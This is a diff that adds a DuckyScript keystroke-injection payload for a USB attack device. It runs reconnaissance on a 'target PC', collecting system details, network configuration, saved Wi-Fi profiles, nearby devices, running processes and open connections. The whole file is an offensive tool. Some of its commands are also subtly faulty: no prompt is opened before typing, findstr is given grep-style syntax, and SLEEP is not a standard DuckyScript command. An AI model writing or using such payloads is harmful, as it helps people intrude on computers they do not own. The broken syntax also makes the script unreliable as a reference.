@@ -1,0 +1,67 @@
+REM ============================================================
+REM   Full System Recon Script
+REM   Gathers all available info from the target PC
+REM ============================================================
+
+DELAY 2000
+
+STRING ============================================
+ENTER
+STRING   FULL SYSTEM RECONNAISSANCE
+ENTER
+STRING   Running on: %COMPUTERNAME%
+ENTER
+STRING ============================================
+ENTER
+ENTER
+
+REM System Info
+STRING systeminfo | findstr /I "OS\|Hostname\|Total Physical Memory\|System Boot Time"
+ENTER
+DELAY 2000
+
+REM Network Config
+ENTER
+STRING echo. && echo === NETWORK CONFIGURATION ===
+ENTER
+STRING ipconfig /all | findstr /I "IPv4\|DNS\|Physical\|DHCP"
+ENTER
+DELAY 1500
+
+REM WiFi Passwords
+ENTER
+STRING echo. && echo === SAVED WIFI PASSWORDS ===
+ENTER
+STRING netsh wlan show profiles
+ENTER
+DELAY 2000
+
+REM ARP Table (local network devices)
+ENTER
+STRING echo. && echo === LOCAL NETWORK DEVICES ===
+ENTER
+STRING arp -a
+ENTER
+DELAY 1500
+
+REM Running Processes (top 20 by memory usage)
+ENTER
+STRING echo. && echo === TOP PROCESSES BY MEMORY ===
+ENTER
+STRING tasklist /FI "MEMUSAGE gt 10000" /FO LIST | findstr /I "Image Memory"
+ENTER
+DELAY 1500
+
+REM Open Network Connections
+ENTER
+STRING echo. && echo === ACTIVE CONNECTIONS ===
+ENTER
+STRING netstat -ano | findstr ESTABLISHED
+ENTER
+DELAY 1500
+
+STRING echo.
+ENTER
+STRING echo Recon complete! Press any key to close...
+ENTER
+SLEEP 2000
